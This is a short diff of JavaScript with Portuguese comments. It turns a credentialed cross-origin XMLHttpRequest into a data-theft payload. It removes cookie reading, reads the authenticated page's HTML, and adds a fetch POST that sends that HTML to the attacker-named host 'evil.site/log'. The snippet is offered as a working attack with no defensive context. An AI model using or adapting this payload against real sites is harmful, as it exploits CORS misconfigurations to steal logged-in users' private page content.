@@ -4,11 +4,20 @@ xhr.withCredentials = true;  // Envia cookies com a requisição CORS
 
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4 && xhr.status == 200) {
-    // A resposta contém os cookies da resposta 'Set-Cookie'
-    var cookies = xhr.getResponseHeader('Set-Cookie');
+    // A resposta contém o conteúdo HTML da página
+    var htmlContent = xhr.responseText;
     
-    // Exibe os cookies no console
-    alert('Cookies recebidos: ', cookies);
+    // Exibe o conteúdo HTML no console
+    console.log('Conteúdo HTML da página:', htmlContent);
+
+    // Se você quiser enviar o conteúdo para seu servidor, pode usar fetch:
+    fetch('https://evil.site/log', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ html: htmlContent })
+    });
   }
 };
 xhr.send();  // Envia a requisição
